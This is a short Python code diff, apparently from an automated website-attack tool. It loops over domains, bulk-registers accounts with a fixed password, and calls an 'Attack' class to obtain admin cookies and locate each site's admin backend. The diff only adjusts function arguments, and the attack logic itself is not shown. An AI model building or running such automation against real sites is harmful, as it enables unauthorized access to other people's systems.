@@ -23,12 +23,12 @@ def start(i):
             time.sleep(3)
             continue
         url = domain_model[1]
-        reg_result = 批量注册.注册(url)
+        reg_result = 批量注册.注册(url,num=0)
         if reg_result['res']:
             print(url + '--------注册成功，准备找空间')
             status = 2
             des = reg_result['info']
-            atk = 找空间.Attack(domain=url, user=reg_result['info'], pwd="qwe123")
+            atk = 找空间.Attack(domain=url, back_ground_url="", user=reg_result['info'], pwd="qwe123")
             home_result = atk.get_admin_cookie()
             if home_result['res']:
                 print(url+'---------找到空间，准备找后台')
